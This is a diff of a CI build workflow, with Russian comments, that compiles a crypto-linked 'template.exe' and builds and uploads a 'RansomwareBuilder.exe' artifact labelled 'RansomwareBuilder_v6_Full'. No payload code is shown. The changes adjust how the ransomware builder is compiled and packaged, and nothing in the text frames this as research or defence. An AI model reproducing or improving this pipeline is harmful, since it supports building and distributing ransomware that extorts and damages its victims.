@@ -56,7 +56,6 @@ jobs:
         Write-Host "Found libssl.lib at: $ssl_lib"
         Write-Host "Found libcrypto.lib at: $crypto_lib"
         
-        # ДОБАВЛЯЕМ ws2_32.lib (Winsock) — нужен для OpenSSL на Windows
         cl /O2 /MT /EHsc /std:c++17 /I"C:\vcpkg\installed\x64-windows-static\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib ws2_32.lib "$ssl_lib" "$crypto_lib"
         
         if (Test-Path template.exe) {
@@ -67,19 +66,17 @@ jobs:
             exit 1
         }
     
-    # ========== СБОРКА БИЛДЕРА ==========
-    - name: Setup .NET
-      uses: actions/setup-dotnet@v4
-      with:
-        dotnet-version: '4.8.x'
+    # ========== СБОРКА БИЛДЕРА (C#) ==========
+    - name: Setup MSBuild
+      uses: microsoft/setup-msbuild@v2
     
     - name: Build Builder
       run: |
-        dotnet build builder.csproj --configuration Release
-        Get-ChildItem bin/Release/net48/RansomwareBuilder.exe | Format-Table -AutoSize
+        msbuild builder.csproj /p:Configuration=Release /p:Platform="Any CPU"
+        Get-ChildItem bin\Release\RansomwareBuilder.exe | Format-Table -AutoSize
     
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
       with:
         name: RansomwareBuilder_v6_Full
-        path: bin/Release/net48/RansomwareBuilder.exe
+        path: bin\Release\RansomwareBuilder.exe
